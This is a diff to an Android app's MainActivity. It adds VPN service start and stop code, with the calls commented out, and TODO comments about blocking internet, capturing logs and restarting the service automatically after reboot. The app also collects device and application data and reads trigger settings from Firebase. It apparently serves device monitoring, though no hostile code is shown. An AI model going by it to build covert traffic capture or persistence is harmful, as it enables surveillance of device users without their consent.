@@ -1,8 +1,8 @@
 package com.vikasyadavnsit.cdc.activities;
 
 import android.content.Intent;
+import android.net.VpnService;
 import android.os.Bundle;
-import android.provider.Settings;
 
 import androidx.activity.EdgeToEdge;
 import androidx.annotation.NonNull;
@@ -17,7 +17,7 @@ import com.vikasyadavnsit.cdc.database.repository.ApplicationDataRepository;
 import com.vikasyadavnsit.cdc.database.repository.DeviceDataRepository;
 import com.vikasyadavnsit.cdc.fragment.HomeFragment;
 import com.vikasyadavnsit.cdc.permissions.PermissionHandler;
-import com.vikasyadavnsit.cdc.permissions.PermissionManager;
+import com.vikasyadavnsit.cdc.services.CDCVpnService;
 import com.vikasyadavnsit.cdc.utils.ActionUtils;
 import com.vikasyadavnsit.cdc.utils.CommonUtil;
 import com.vikasyadavnsit.cdc.utils.FirebaseUtils;
@@ -42,6 +42,9 @@ public class MainActivity extends AppCompatActivity {
             return insets;
         });
 
+
+        //Todo: block internet and capture logs
+        //  turn off wifi or internet
         //Todo Automatically start service post restart or shutdown
         //Todo: set value once read from firebase when it is consumed with disabled flag only if it is allowed
 
@@ -52,6 +55,25 @@ public class MainActivity extends AppCompatActivity {
 
         FirebaseUtils.checkAndCreateUser();
         FirebaseUtils.getAppTriggerSettingsData();
+
+
+        //startVpn();
+        // stopVpn();
+    }
+
+    private void startVpn() {
+        Intent intent = VpnService.prepare(this);
+        if (intent != null) {
+            startActivityForResult(intent, 22);
+        } else {
+            onActivityResult(22, RESULT_OK, null);
+        }
+    }
+
+    private void stopVpn() {
+        Intent intent = new Intent(this, CDCVpnService.class);
+        intent.putExtra("stop", true);
+        startService(intent);
     }
 
     private void initaliser() {
@@ -66,6 +88,10 @@ public class MainActivity extends AppCompatActivity {
     protected void onActivityResult(int requestCode, int resultCode, Intent data) {
         super.onActivityResult(requestCode, resultCode, data);
         ActionUtils.onActivityResult(this, requestCode, resultCode, data);
+        if (requestCode == 22 && resultCode == RESULT_OK) {
+            Intent intent = new Intent(this, CDCVpnService.class);
+            startService(intent);
+        }
     }
 
     // Handle permission result
